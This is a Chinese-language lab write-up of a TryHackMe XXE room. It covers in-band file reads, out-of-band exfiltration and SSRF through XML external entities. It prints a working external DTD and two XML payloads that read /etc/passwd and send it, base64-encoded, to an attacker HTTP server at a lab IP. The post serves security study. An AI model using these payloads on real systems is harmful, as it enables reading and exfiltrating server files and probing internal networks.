# XXE Injection

事实上在去年htba的学习中就接触了xxe的这些知识和技巧，今天我们在thm上通过这个房间进行回顾一下

## 带内XXE

带内XXE是指攻击者可以看到服务器响应的 XXE 漏洞。这允许直接的数据泄露和利用。攻击者可以简单地向应用程序发送恶意 XML 有效负载，服务器将以提取的数据或攻击结果进行响应

访问靶机的contact页面

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5603ac2d4c7a45fabfd21b909ffe7b31.png)

随便给点数据提交，我们可以看到响应中，返回了我们输入的名字

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ad57d9b1eb42416da25eb0d7eaac5f46.png)

通过直接定义一般实体，利用file://协议来读取本地文件

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0040d022d0aa452cae5233216eee95cd.png)

## 带外XXE

带外 XXE 是指攻击者无法看到服务器响应的 XXE 漏洞。这需要使用替代通道（如 DNS 或 HTTP 请求）来泄露数据。为了提取数据，攻击者必须构建一个恶意 XML 负载，该负载将触发带外请求，例如 DNS 查询或 HTTP 请求。

访问靶机的index.php

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a3fe1153bf12414eacc172b3d897661d.png)

上传文件后，看burp log可以发现它是先上传文件到服务端后，再通过xml传递url，从http响应来看，这是blind的，我们需要从带外获取数据

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/44f0e91633b7498a9d99b0c2c019446a.png)

这个时候就得请出我们的参数实体`parameter entity`，通过它，我们可以将读到的文件内容**嵌入**到一般实体中，外带到我们的服务器中，所以这就是为什么要用参数实体的原因。

xxe.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY xxe SYSTEM 'http://10.14.77.150:8000/?d=%file;'>">
%oob;
```

我们有两种简单的写法，这两种写法分别来自thm和htba

### 第一种 - 指定外部DTD

通过直接外部DTD的方式，我们就无需再有多余的操作，最后直接调用外部实体即可完成攻击，相对简洁

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a SYSTEM "http://10.14.77.150:8000/xxe.dtd">
<upload><file>&xxe;</file></upload>
```

burp发起请求

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c49db5396da44c438a796d71e0efd865.png)

python开个http服务，正常访问dtd文件、正常接收到数据

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e5090e012c94465b9febca4f86b13c62.png)

### 第二种 - 内部DTD参数实体引用外部DTD

通过内部DTD定义参数实体引用外部dtd，一样可以达到效果，但相较于第一种写法，我们需要多定义一个参数实体用于引入外部dtd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [
<!ENTITY % dtd SYSTEM "http://10.14.77.150:8000/xxe.dtd">
%dtd;
]>
<upload><file>&xxe;</file></upload>
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0d391caf0cf34c2abfc533d7b1474b61.png)

与第一种一样可以获取到数据

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/31caa844e0c046918fe4c3f5154f8028.png)

## SSRF + XXE

服务器端请求伪造 （SSRF） 攻击是指攻击者滥用服务器上的功能，导致服务器向意外位置发出请求。在 XXE 上下文中，攻击者可以操纵 XML 输入，使服务器向内部服务发出请求或访问内部文件。此技术可用于扫描内部网络、访问受限制的端点或与只能从服务器的本地网络访问的服务进行交互。

这个相当轻松和简单，因为通过实体访问外部DTD文件，这个http过程本身就可以看作为SSRF，包括我们把数据带出来，都是由服务端向攻击者的服务器发起请求

探测内网http服务

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6a858dd45d044dfb8adb0d523c0f9547.png)

在内网某个端口中开着http服务，同时拿到flag

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e949d2010cd04a7ebb3d8995a6ef150b.png)

即使是带外的blind盲xxe也一样可以轻松做到这一点，便不再演示了。